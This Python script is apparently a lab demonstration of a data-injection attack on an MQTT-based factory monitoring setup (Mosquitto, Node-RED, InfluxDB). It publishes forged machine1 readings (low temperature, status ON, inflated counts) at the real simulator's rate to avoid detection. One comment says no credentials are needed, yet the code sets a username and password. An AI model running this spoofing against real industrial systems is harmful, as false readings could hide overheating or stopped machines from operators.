import time
import json
import random
import paho.mqtt.client as mqtt

# We connect to the SAME broker as the legitimate simulator
# No username, no password needed — Mosquitto accepts anyone
# This is the core vulnerability we are demonstrating
BROKER = "localhost"  # localhost because we run this on Windows, outside Docker
PORT = 1883

# WHY localhost not mosquitto:
# The simulator runs INSIDE Docker so it uses the container name "mosquitto"
# This attack script runs OUTSIDE Docker on your Windows machine
# so it uses localhost (which maps to the Mosquitto port we exposed: 1883:1883)

client = mqtt.Client(client_id="rogue_attacker_001")
client.username_pw_set("simulator", "simulator123")
client.connect(BROKER, PORT, 60)

print("=" * 60)
print("ATTACK 1 — DATA INJECTION")
print("=" * 60)
print("Injecting false sensor data into factory/machine1/data")
print("The legitimate simulator is still running.")
print("Node-RED will receive BOTH real and fake messages.")
print("Fake data will corrupt the dashboard and InfluxDB records.")
print("=" * 60)
print()

injection_count = 0

while True:
    # We send temperatures that are LOWER than normal operating range
    # In a real attack this would hide an overheating machine
    # The operator sees a cool safe reading — the machine is actually burning
    fake_temperature = round(random.uniform(15, 25), 2)

    # status always ON:
    # Making a broken machine appear running
    # Production count keeps increasing even if machine is stopped
    fake_status = "ON"
    fake_production = random.randint(9000, 9999)  # suspiciously high count

    fake_data = {
        "machine_id": "machine1",   # pretending to be machine1
        "status": fake_status,
        "temperature": fake_temperature,
        "production_count": fake_production,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "injected": True            # we add this field so WE can see it
                                    # but Node-RED doesn't check for it
    }

    payload = json.dumps(fake_data)

    # same topic as machine1:
    # Mosquitto doesn't verify who is allowed to publish where
    # Anyone can publish to any topic — no access control
    client.publish("factory/machine1/data", payload)
    injection_count += 1

    print(f"[INJECTION #{injection_count}] Sent fake data: "
          f"temp={fake_temperature}°C, "
          f"count={fake_production}, "
          f"status={fake_status}")

    # same 3 second interval:
    # Matching the real simulator's timing makes the attack harder to detect
    # The message rate looks normal — just the VALUES are wrong
    time.sleep(3)